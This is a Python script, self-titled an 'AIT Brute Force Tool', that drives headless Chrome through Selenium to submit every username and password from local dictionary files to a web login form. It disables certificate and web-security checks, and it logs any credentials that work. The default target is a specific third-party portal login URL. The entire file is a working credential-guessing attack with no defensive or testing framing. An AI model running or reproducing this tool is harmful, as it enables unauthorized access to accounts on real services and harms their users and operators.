import os
import logging
import argparse
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException

# Setup logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

def get_available_directories():
    """Retrieve available subdirectories in the 'Dictionary' folder."""
    script_dir = os.path.dirname(os.path.abspath(__file__))
    dictionary_path = os.path.join(script_dir, "Dictionary")

    if not os.path.exists(dictionary_path):
        logging.error("Error: 'Dictionary' directory does not exist!")
        return {}

    directories = {
        str(index + 1): name for index, name in enumerate(sorted(os.listdir(dictionary_path)))
        if os.path.isdir(os.path.join(dictionary_path, name))
    }

    return directories

def get_file_paths(selected_dir):
    """Get the correct file paths based on user selection."""
    script_dir = os.path.dirname(os.path.abspath(__file__))
    dictionary_path = os.path.join(script_dir, "Dictionary", selected_dir)

    return {
        "prefix": os.path.join(script_dir, "Dictionary", "prefix.txt"),
        "username": os.path.join(dictionary_path, "username.txt"),
        "password": os.path.join(dictionary_path, "password.txt"),
    }

def load_credentials(selected_dir):
    """Load usernames and passwords from the chosen dictionary directory."""
    file_paths = get_file_paths(selected_dir)

    if not all(os.path.exists(path) for path in file_paths.values()):
        logging.error("Error: One or more credential files are missing.")
        return [], []

    try:
        with open(file_paths["prefix"], "r", encoding="utf-8") as pf:
            prefix = pf.read().strip()
        with open(file_paths["username"], "r", encoding="utf-8") as uf:
            usernames = [prefix + line.strip() for line in uf if line.strip()]
        with open(file_paths["password"], "r", encoding="utf-8") as pf:
            passwords = [line.strip() for line in pf if line.strip()]
        return usernames, passwords
    except Exception as e:
        logging.error(f"Error loading credentials: {e}")
        return [], []

def execute_level(level):
    """Handle user selection for execution level."""
    if level == "1":
        logging.info("Executing Basic Level...")

        # Get available directories dynamically
        dir_names = get_available_directories()
        if not dir_names:
            logging.error("No directories found inside 'Dictionary'. Exiting.")
            return

        # Display available directory options
        print("\nAvailable Dictionary Directories:")
        for key, value in dir_names.items():
            print(f"{key}: {value}")

        choice = input("\nSelect a directory (Enter number): ").strip()
        if choice in dir_names:
            selected_dir = dir_names[choice]
            usernames, passwords = load_credentials(selected_dir)

            if not usernames or not passwords:
                logging.error("No usernames or passwords loaded. Exiting...")
                return

            start_webdriver(usernames, passwords)
        else:
            logging.error("Invalid directory choice. Exiting.")
    else:
        logging.error("Invalid execution level. Exiting.")

def start_webdriver(usernames, passwords):
    """Initialize WebDriver and perform login attempts."""
    parser = argparse.ArgumentParser(description="AIT Brute Force Tool")
    parser.add_argument("--login_url", type=str, default="http://urbanlink.net.ph/urban/urbanlogin.html", help="Custom login URL")
    parser.add_argument("--wrong_url", type=str, default="http://urbanlink.net.ph/urban/login", help="Wrong login redirect URL")
    args = parser.parse_args()

    chrome_options = webdriver.ChromeOptions()
    chrome_options.add_argument("--ignore-ssl-errors")
    chrome_options.add_argument("--allow-insecure-localhost")
    chrome_options.add_argument("--disable-web-security")
    chrome_options.add_argument("--ignore-certificate-errors")
    chrome_options.add_argument("--disable-features=NetworkService,VizDisplayCompositor")
    chrome_options.add_argument("--headless")  # Run in headless mode

    try:
        with webdriver.Chrome(options=chrome_options) as driver:
            wait = WebDriverWait(driver, 10)
            driver.get(args.login_url)

            for username in usernames:
                for password in passwords:
                    try:
                        if driver.current_url == args.wrong_url:
                            logging.warning("Redirected to wrong login page. Retrying...")
                            driver.get(args.login_url)

                        user_input = wait.until(EC.presence_of_element_located((By.NAME, "username")))
                        pass_input = driver.find_element(By.NAME, "password")

                        user_input.clear()
                        pass_input.clear()
                        user_input.send_keys(username)
                        pass_input.send_keys(password)
                        pass_input.send_keys(Keys.RETURN)

                        wait.until(lambda d: d.current_url != args.login_url)
                        logging.info(f"Trying: {username} / {password} -> {driver.current_url}")

                        if any(keyword in driver.current_url for keyword in ["dashboard", "success_page", "status"]):
                            logging.info(f"✅ Success! Username: {username}, Password: {password} - Redirected to status page")
                            return

                        success_indicator = driver.find_elements(By.XPATH, "//div[contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'welcome')]")
                        if success_indicator:
                            logging.info(f"✅ Success! Username: {username}, Password: {password}")
                            return

                        logging.info(f"❌ Failed: {username} / {password}")

                    except TimeoutException:
                        logging.error(f"⏳ Timeout waiting for elements. Retrying login for {username}/{password}...")
                    except NoSuchElementException:
                        logging.error(f"⚠️ Login form not found. Skipping {username}/{password}...")
                    except Exception as e:
                        logging.error(f"🚨 Unexpected error: {e}")

            logging.info("❌ No valid credentials found.")

    except Exception as e:
        logging.error(f"🚨 WebDriver error: {e}")

def main():
    """Main function to prompt user choices."""
    print("Choose an execution level:")
    print("1 - Basic Level")
    
    choice = input("Enter your choice: ").strip()
    execute_level(choice)

if __name__ == "__main__":
    main()
